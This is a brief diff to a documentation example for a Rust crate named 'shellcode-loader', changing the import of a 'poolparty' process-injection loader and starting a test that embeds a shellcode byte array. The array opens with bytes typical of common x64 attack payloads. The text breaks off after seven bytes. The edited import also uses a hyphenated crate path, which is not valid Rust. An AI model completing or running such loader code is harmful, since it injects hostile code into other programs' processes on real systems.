@@ -123,7 +123,7 @@ use shellcode-loader::hook::hook_message_box_a;
 
 示例：
 ```
-use crate::loader::poolparty::party_time_1;
+use shellcode-loader::loader::poolparty::party_time_1;
 #[test]
 fn test_poolparty_party_time_1(){ 
     let buf: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
